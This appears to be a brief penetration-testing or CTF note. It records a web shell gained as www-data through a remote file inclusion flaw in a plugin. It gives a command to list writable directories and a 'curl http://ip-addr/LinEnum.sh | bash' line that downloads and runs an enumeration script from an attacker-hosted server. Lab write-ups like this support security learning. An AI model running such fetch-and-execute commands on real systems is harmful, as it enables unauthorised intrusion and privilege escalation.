# user www-data 
## Got shell from an RFI vulnerablility on a plugin gwollen - foudn in www dir
### useful command to find writable directory
```
find . -writable -ls

```

### useful command to download LinEnum.sh and RUN IT 
#### Assume already hosting on a webserver
```
curl http://ip-addr/LinEnum.sh | bash
```
- Tried wget and piping it through but I was denied cause I cannot write
